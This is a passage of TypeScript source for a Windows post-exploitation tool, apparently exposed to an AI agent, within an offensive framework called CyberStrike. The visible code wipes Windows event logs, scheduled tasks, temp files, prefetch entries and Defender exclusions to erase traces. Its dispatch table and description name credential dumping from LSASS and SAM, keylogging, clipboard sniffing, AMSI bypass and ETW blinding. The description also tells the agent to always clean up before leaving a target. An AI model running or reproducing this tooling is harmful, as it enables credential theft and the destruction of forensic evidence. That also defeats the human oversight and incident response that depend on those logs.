  const defenderStatus = await ps("Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AntispywareEnabled, BehaviorMonitorEnabled | ConvertTo-Json", timeout)
  if (defenderStatus.exitCode === 0) {
    output.push(`\n[*] Defender status:\n${defenderStatus.stdout.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function cleanupWin(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike artifacts from Windows target...\n"]
  let cleaned = 0

  const logs = ["Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"]
  for (const log of logs) {
    const clear = await run("wevtutil.exe", ["cl", log], timeout)
    if (clear.exitCode === 0) {
      output.push(`[+] Cleared event log: ${log}`)
      cleaned++
    }
    if (clear.exitCode !== 0) {
      output.push(`[!] Failed to clear ${log}: ${clear.stderr.trim()}`)
    }
  }

  const tasks = await ps(`Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*cyberstrike*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`, timeout)
  if (tasks.exitCode === 0 && tasks.stdout.trim()) {
    for (const t of tasks.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed scheduled task: ${t.trim()}`)
      cleaned++
    }
  }

  const tmpClean = await ps(`
$patterns = @("cs-*", "cyberstrike-*")
$dirs = @($env:TEMP, "C:\\Windows\\Temp")
foreach ($dir in $dirs) {
    foreach ($p in $patterns) {
        Get-ChildItem "$dir\\$p" -ErrorAction SilentlyContinue | ForEach-Object {
            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            Write-Output $_.FullName
        }
    }
}
`, timeout)
  if (tmpClean.exitCode === 0 && tmpClean.stdout.trim()) {
    for (const f of tmpClean.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed temp file: ${f.trim()}`)
      cleaned++
    }
  }

  const defExclusions = await ps(`
$prefs = Get-MpPreference
$csExclusions = $prefs.ExclusionPath | Where-Object { $_ -like '*cs-*' -or $_ -like '*cyberstrike*' }
foreach ($e in $csExclusions) {
    Remove-MpPreference -ExclusionPath $e
    Write-Output $e
}
`, timeout)
  if (defExclusions.exitCode === 0 && defExclusions.stdout.trim()) {
    for (const e of defExclusions.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed Defender exclusion: ${e.trim()}`)
      cleaned++
    }
  }

  const prefetch = await ps(`Remove-Item "C:\\Windows\\Prefetch\\*cyberstrike*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`, timeout)
  if (prefetch.exitCode === 0) {
    output.push("[+] Cleared prefetch entries")
    cleaned++
  }

  output.push(`\n[*] Cleanup complete — ${cleaned} artifacts removed`)
  output.push("\n[*] Note: AMSI/ETW patches are in-memory only — they reset on process exit")
  output.push("[*] Note: Event log clearing itself generates Event ID 1102 (Security log cleared)")

  findings.push({
    checkId: "WIN-CLEANUP-001",
    provider: "windows",
    severity: "info",
    status: "CLEANED",
    resource: "windows://cleanup",
    title: `Windows cleanup: ${cleaned} artifacts removed`,
    details: `Cleared event logs, scheduled tasks, temp files, Defender exclusions, prefetch`,
    remediation: "Verify: Get-WinEvent -LogName Security -MaxEvents 5",
  })

  return { output: output.join("\n"), findings }
}

// ── Dispatch ──

const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
  lsass_dump: lsassDump,
  sam_dump: samDump,
  dpapi_extract: dpapiExtract,
  credential_prompt: credentialPrompt,
  keylog_win: keylogWin,
  etw_process: etwProcess,
  etw_network: etwNetwork,
  clipboard_sniff: clipboardSniff,
  amsi_bypass: amsiBypass,
  etw_blind: etwBlind,
  defender_exclude: defenderExclude,
  cleanup_win: cleanupWin,
}

export const WinhookTool = Tool.define("winhook", {
  description: `Execute a Windows post-exploitation program for userland credential harvesting, monitoring, and stealth operations. Requires Administrator privileges on the target. Available programs: ${Object.keys(PROGRAMS).join(", ")}. No kernel driver signing needed — all techniques use userland APIs (PowerShell + Add-Type C#). ALWAYS run cleanup_win before leaving a target.`,
  parameters: z.object({
    program: z.enum(Object.keys(PROGRAMS) as [string, ...string[]]).describe(
      "Windows post-exploitation program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(120).describe("Maximum execution time in seconds (default: 120)"),
  }),
  async execute(params) {
    if (process.platform !== "win32") {
      return {
        title: `winhook: ${params.program}`,
        output: `winhook requires Windows. Current platform: ${process.platform}\n\nUse 'ebpf' for Linux post-exploitation or 'machook' for macOS.`,
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const program = params.program as Program
    const handler = dispatch[program]
    const result = await handler(params.args, params.timeout_seconds)

    return {
      title: `winhook: ${program}`,
      output: result.output,
      metadata: { program, findings: result.findings },
    }
  },
})
